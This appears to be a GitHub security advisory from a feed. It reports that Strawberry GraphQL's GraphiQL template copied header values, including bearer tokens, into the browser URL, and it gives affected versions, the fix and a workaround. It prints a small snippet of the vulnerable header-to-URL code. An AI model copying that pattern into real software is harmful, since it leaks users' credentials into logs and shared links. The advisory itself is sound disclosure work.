-<p>Strawberry's bundled GraphiQL template wrote values from the GraphiQL headers editor into the browser URL query string. If a user entered a sensitive header, such as <code>Authorization: Bearer &lt;token&gt;</code>, the value could become visible in browser history, copied links, and server/proxy/CDN access logs after a page reload or shared request.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<ul>
-<li>Affected: <code>strawberry-graphql &gt;= 0.288.4, &lt;= 0.315.3</code></li>
-<li>Patched: 0.315.4</li>
-</ul>
-<p>The vulnerable behavior was introduced by the GraphiQL URL-sharing implementation in commit <code>9315ef80</code>, first included in release <code>0.288.4</code>.</p>
-<h2 id="impact">Impact</h2>
-<p>Applications that expose Strawberry's default GraphiQL IDE may leak sensitive HTTP header values entered by users into the GraphiQL headers editor. The default IDE is enabled by <code>graphql_ide="graphiql"</code> across Strawberry HTTP integrations unless disabled or replaced by the application.</p>
-<p>The exposure is limited to the browser-based IDE. GraphQL query execution is not affected, and this issue does not allow an attacker to directly execute operations or bypass authorization. Practical exploitation requires a user to enter a secret into the GraphiQL headers editor and then expose the resulting URL, for example by refreshing the page, copying the URL, sharing the URL, or causing the URL to be recorded by logging infrastructure.</p>
-<h2 id="technical-details">Technical Details</h2>
-<p>The bundled <code>strawberry/static/graphiql.html</code> template parsed URL query parameters into a <code>parameters</code> object and used those values to initialize GraphiQL state. It also updated the URL on editor changes using <code>history.replaceState</code>.</p>
-<p>Before the fix, header values were handled like shareable query text and variables:</p>
-<pre><code class="language-js">const [headers, setHeaders] = React.useState(parameters.headers);
-
-function onEditHeaders(newHeaders) {
-  setHeaders(newHeaders);
-  updateURL({ headers: newHeaders });
-}
-</code></pre>
-<p>This meant arbitrary header text entered into the IDE could be serialized into <code>?headers=...</code>.</p>
-<h2 id="fix">Fix</h2>
-<p>The GraphiQL template no longer calls <code>updateURL</code> from <code>onEditHeaders</code>. Query and variable URL sharing remain unchanged, and existing URLs with <code>headers=...</code> can still initialize the headers editor. Header persistence via GraphiQL's own <code>shouldPersistHeaders: true</code> behavior remains enabled, so newly edited headers can still persist locally without being placed in the URL.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Until a patched version can be used, applications can mitigate this issue by disabling the bundled IDE in production:</p>
-<pre><code class="language-python">GraphQLRouter(schema, graphql_ide=None)
-</code></pre>
-<p>Equivalent <code>graphql_ide=None</code> configuration is available in Strawberry's other HTTP integrations.</p>
-<p>Applications can also provide a custom GraphiQL template that does not serialize header values into the URL.</p>
-<h2 id="credits">Credits</h2>
-<p>Reported by <code>@lpschroer</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/strawberry-graphql/strawberry/security/advisories/GHSA-x97m-qp5c-w9xj">https://github.com/strawberry-graphql/strawberry/security/advisories/GHSA-x97m-qp5c-w9xj</a></li>
-<li><a href="https://github.com/strawberry-graphql/strawberry/issues/4398">https://github.com/strawberry-graphql/strawberry/issues/4398</a></li>
-<li><a href="https://github.com/strawberry-graphql/strawberry/pull/2842">https://github.com/strawberry-graphql/strawberry/pull/2842</a></li>
-<li><a href="https://github.com/advisories/GHSA-x97m-qp5c-w9xj">https://github.com/advisories/GHSA-x97m-qp5c-w9xj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-x97m-qp5c-w9xj</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-19T15:55:07.000Z</published>
     </entry>
 </feed>
